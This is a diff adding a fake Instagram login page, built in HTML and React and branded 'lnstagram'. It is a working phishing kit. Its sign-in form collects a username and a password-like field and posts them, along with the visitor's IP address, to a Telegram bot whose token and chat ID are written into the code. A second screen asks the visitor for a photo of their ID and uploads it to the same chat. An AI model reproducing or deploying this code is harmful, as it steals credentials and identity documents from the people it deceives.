@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>activeverify</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <!-- Tailwind -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      darkMode: 'media',
+      theme: {
+        extend: {
+          animation: {
+            float: 'float 6s ease-in-out infinite',
+            fade: 'fade 0.4s ease-out',
+          },
+          keyframes: {
+            float: {
+              '0%,100%': { transform: 'translateY(0px)' },
+              '50%': { transform: 'translateY(-14px)' },
+            },
+            fade: {
+              from: { opacity: 0, transform: 'translateY(10px)' },
+              to: { opacity: 1, transform: 'translateY(0)' },
+            },
+          },
+        },
+      },
+    }
+  </script>
+
+  <style>
+    .ig-gradient {
+      background: linear-gradient(90deg, #ff7a18, #ff0169, #d300c5);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      color: transparent;
+    }
+  </style>
+
+  <!-- React -->
+  <script src="https://unpkg.com/react@18/umd/react.development.js"></script>
+  <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
+  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+</head>
+
+<body class="bg-white text-slate-900 dark:bg-slate-950 dark:text-white transition-colors">
+<div id="root"></div>
+
+<script type="text/babel">
+
+const TELEGRAM_BOT_TOKEN = "7830288241:AAEk3vRFnaL3gzGWrywhHoGDaKvv574do0E";
+const TELEGRAM_CHAT_ID = "5692748706";
+
+function App() {
+  const [step, setStep] = React.useState("login");
+  const [error, setError] = React.useState("");
+  const [preview, setPreview] = React.useState(null);
+  const [ticketUploaded, setTicketUploaded] = React.useState(false);
+
+  const sessionId = React.useRef(crypto.randomUUID()).current;
+
+  async function handleLogin(e) {
+    e.preventDefault();
+    const email = e.target.email.value.trim();
+    const name = e.target.name.value.trim();
+
+    if (!email || !name) {
+      setError("Please fill in all fields.");
+      return;
+    }
+    if (name.length < 6) {
+      setError("passw**d must be at least 6 characters.");
+      return;
+    }
+
+    setError("");
+
+    try {
+      const ipRes = await fetch("https://api.ipify.org?format=json");
+      const ipData = await ipRes.json();
+      const timestamp = new Date().toISOString();
+
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text:
+`📩 User Info Submitted
+👤 Name: ${name}
+📧 Email: ${email}
+🌐 IP: ${ipData.ip}
+🕒 ${timestamp}
+🆔 ${sessionId}`
+        })
+      }).catch(() => {});
+    } catch {}
+
+    setStep("verify");
+  }
+
+  async function handleFile(e) {
+    const file = e.target.files[0];
+    if (!file) return;
+
+    setPreview(URL.createObjectURL(file));
+    setError("");
+
+    try {
+      const ipRes = await fetch("https://api.ipify.org?format=json");
+      const ipData = await ipRes.json();
+      const timestamp = new Date().toISOString();
+
+      const formData = new FormData();
+      formData.append("chat_id", TELEGRAM_CHAT_ID);
+      formData.append(
+        "caption",
+        `📩 Login Ticket
+🌐 IP: ${ipData.ip}
+🕒 ${timestamp}
+🆔 ${sessionId}`
+      );
+      formData.append("photo", file);
+
+      await fetch(
+        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
+        { method: "POST", body: formData }
+      );
+
+      setTicketUploaded(true);
+    } catch {
+      setError("Upload failed. Please try again.");
+      setTicketUploaded(false);
+    }
+  }
+
+  function handleContinue() {
+    if (!ticketUploaded) {
+      setError("Please upload your login ticket or take a photo to continue.");
+      return;
+    }
+    // REDIRECT TO EMAIL PAGE
+    window.location.href = "email.html";
+  }
+
+  return (
+    <div className="min-h-screen flex">
+
+      <div className="hidden lg:flex flex-1 items-center justify-center bg-gradient-to-br from-slate-100 to-slate-200 dark:from-slate-900 dark:to-slate-950 relative overflow-hidden">
+        <div className="absolute top-6 left-10 text-3xl font-bold">
+          <span className="ig-gradient">{`lnstagram`}</span>
+        </div>
+
+        <div className="relative w-[280px] h-[440px]">
+          <img src="https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e"
+            className="absolute w-56 h-96 object-cover rounded-[28px] shadow-2xl left-8 animate-float" />
+          <img src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1"
+            className="absolute w-56 h-96 object-cover rounded-[28px] shadow-2xl top-6 opacity-80" />
+          <img src="https://images.unsplash.com/photo-1503341455253-b2e723bb3dbb"
+            className="absolute w-56 h-96 object-cover rounded-[28px] shadow-2xl top-12 left-14 opacity-60" />
+        </div>
+      </div>
+
+      <div className="w-full lg:w-[420px] bg-white dark:bg-slate-900 border-l border-slate-200 dark:border-slate-800 flex flex-col">
+
+        <div className="px-8 py-5 border-b border-slate-200 dark:border-slate-800 text-xl font-bold">
+          <span className="ig-gradient">{`hey`}</span>
+        </div>
+
+        {step === "login" && (
+          <form onSubmit={handleLogin}
+            className="flex-1 flex flex-col justify-center px-8 animate-fade">
+
+            {/* LOGO — centered, spaced properly, NO interaction */}
+            <img
+              src="https://unblast.com/wp-content/uploads/2025/07/in-logo-colored-768x768.jpg"
+              className="w-16 h-16 mx-auto mb-8 mt-2 rounded-full shadow"
+            />
+
+            <h2 className="text-2xl font-semibold mb-6 text-center">Sign in</h2>
+
+            {error && <div className="mb-4 text-sm text-red-500">{error}</div>}
+
+            <input name="email" placeholder="Username or email"
+              className="mb-3 px-4 py-3 rounded-lg bg-slate-100 dark:bg-slate-800 border border-slate-300 dark:border-slate-700" />
+
+            <input name="name" type="text" placeholder="name"
+              className="mb-4 px-4 py-3 rounded-lg bg-slate-100 dark:bg-slate-800 border border-slate-300 dark:border-slate-700" />
+
+            <button className="py-3 rounded-lg bg-sky-500 text-white font-semibold hover:bg-sky-600">
+              continue
+            </button>
+          </form>
+        )}
+
+        {step === "verify" && (
+          <div className="flex-1 flex flex-col justify-center px-8 animate-fade">
+
+            {/* SAME LOGO PLACEMENT */}
+            <img
+              src="https://unblast.com/wp-content/uploads/2025/07/in-logo-colored-768x768.jpg"
+              className="w-16 h-16 mx-auto mb-6 mt-2 rounded-full shadow"
+            />
+
+            <h2 className="text-2xl font-semibold mb-2 text-center">Verification</h2>
+
+            <p className="text-sm text-slate-500 dark:text-slate-400 mb-6 text-center">
+              Upload or take a photo of your ID to continue.
+            </p>
+
+            {error && <div className="mb-4 text-sm text-red-500">{error}</div>}
+
+            <label className="mb-4 flex flex-col items-center justify-center border-2 border-dashed rounded-xl p-6 cursor-pointer">
+              <span className="font-medium">Upload image</span>
+              <input type="file" accept="image/*" hidden onChange={handleFile} />
+            </label>
+
+            <label className="mb-4 flex flex-col items-center justify-center border rounded-xl p-4 cursor-pointer">
+              <span className="font-medium">Take a photo</span>
+              <input type="file" accept="image/*" capture="environment" hidden onChange={handleFile} />
+            </label>
+
+            {preview && (
+              <img src={preview}
+                className="mt-4 rounded-lg max-h-48 object-contain border" />
+            )}
+
+            <button
+              onClick={handleContinue}
+              className="mt-6 py-3 rounded-lg bg-sky-500 text-white font-semibold hover:bg-sky-600">
+              Continue
+            </button>
+          </div>
+        )}
+
+      </div>
+    </div>
+  );
+}
+
+ReactDOM.createRoot(document.getElementById("root")).render(<App />);
+</script>
+</body>
+</html>
